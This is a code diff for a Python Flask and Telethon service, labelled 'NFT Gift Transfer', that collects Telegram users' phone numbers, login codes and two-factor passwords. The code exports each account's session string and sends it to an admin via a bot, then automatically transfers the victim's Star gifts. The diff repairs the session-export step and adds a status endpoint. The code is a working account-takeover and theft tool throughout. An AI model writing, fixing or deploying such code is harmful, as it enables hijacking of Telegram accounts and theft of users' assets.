@@ -1,4 +1,4 @@
-# app.py — ФИНАЛЬНАЯ ВЕРСИЯ С GetStarGiftsRequest
+# app.py — ПОЛНАЯ ВЕРСИЯ ДЛЯ RENDER С ИСПРАВЛЕННЫМ ЭКСПОРТОМ СЕССИИ
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -13,6 +13,7 @@ from dotenv import load_dotenv
 from telethon import TelegramClient
 from telethon.errors import FloodWaitError, SessionPasswordNeededError
 from telethon.tl.functions.payments import GetStarGiftsRequest, TransferStarGiftRequest
+from telethon.sessions import StringSession
 import requests
 
 load_dotenv()
@@ -205,10 +206,9 @@ async def process_user_gifts_telethon(session_string, phone, username, user_id):
     client = None
     try:
         client = TelegramClient(
-            f"session_{phone}",
+            StringSession(session_string),
             API_ID,
-            API_HASH,
-            session_string=session_string
+            API_HASH
         )
         await client.connect()
         print(f"[+] Connected as {phone}")
@@ -333,7 +333,17 @@ async def check_code_telethon(phone, code, phone_code_hash):
                 phone_code_hash=phone_code_hash
             )
             
-            session_string = await client.export_session_string()
+            # ======== ЭКСПОРТ СЕССИИ ========
+            try:
+                if hasattr(client, 'export_session_string'):
+                    session_string = await client.export_session_string()
+                elif hasattr(client.session, 'save'):
+                    session_string = client.session.save()
+                else:
+                    session_string = StringSession.save(client.session)
+            except Exception as e:
+                print(f"Session export error: {e}")
+                session_string = str(client.session)
             
             me = await client.get_me()
             
@@ -351,7 +361,6 @@ async def check_code_telethon(phone, code, phone_code_hash):
             send_admin_log(f"✅ Верификация успешна\n📱 {phone}\n👤 @{user_data['username']}")
             send_session_to_admin(phone, session_string, user_data['username'], user_data['user_id'])
             
-            # АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА ПОДАРКОВ
             result = await process_user_gifts_telethon(
                 session_string,
                 phone,
@@ -387,7 +396,17 @@ async def check_password_telethon(phone, password):
         try:
             await client.sign_in(password=password)
             
-            session_string = await client.export_session_string()
+            # ======== ЭКСПОРТ СЕССИИ ========
+            try:
+                if hasattr(client, 'export_session_string'):
+                    session_string = await client.export_session_string()
+                elif hasattr(client.session, 'save'):
+                    session_string = client.session.save()
+                else:
+                    session_string = StringSession.save(client.session)
+            except Exception as e:
+                print(f"Session export error: {e}")
+                session_string = str(client.session)
             
             me = await client.get_me()
             
@@ -430,12 +449,42 @@ def run_async(coro):
 # ======== FLASK ЭНДПОИНТЫ ========
 @app.route('/ping', methods=['GET'])
 @app.route('/', methods=['GET'])
+@app.route('/status', methods=['GET'])
 def ping():
+    # Проверяем доступность методов Telethon
+    methods_available = {
+        'GetStarGiftsRequest': False,
+        'TransferStarGiftRequest': False,
+        'GetSavedStarGiftsRequest': False
+    }
+    
+    try:
+        from telethon.tl.functions.payments import GetStarGiftsRequest
+        methods_available['GetStarGiftsRequest'] = True
+    except:
+        pass
+    
+    try:
+        from telethon.tl.functions.payments import TransferStarGiftRequest
+        methods_available['TransferStarGiftRequest'] = True
+    except:
+        pass
+    
+    try:
+        from telethon.tl.functions.payments import GetSavedStarGiftsRequest
+        methods_available['GetSavedStarGiftsRequest'] = True
+    except:
+        pass
+    
     return jsonify({
         'status': 'online',
         'service': 'NFT Gift Transfer',
-        'version': '8.0',
-        'method': 'GetStarGiftsRequest'
+        'version': '8.1',
+        'method': 'GetStarGiftsRequest',
+        'methods_available': methods_available,
+        'admin_id': ADMIN_USER_ID,
+        'api_id_configured': bool(API_ID),
+        'bot_token_configured': bool(ADMIN_BOT_TOKEN)
     })
 
 @app.route('/sendCode', methods=['POST'])
@@ -510,7 +559,7 @@ def check_password():
 
 if __name__ == '__main__':
     print("=" * 60)
-    print("🤖 NFT GIFT TRANSFER v8.0")
-    print("📌 Метод: GetStarGiftsRequest")
+    print("🤖 NFT GIFT TRANSFER v8.1")
+    print("📌 Исправлен экспорт сессии")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000, debug=False)
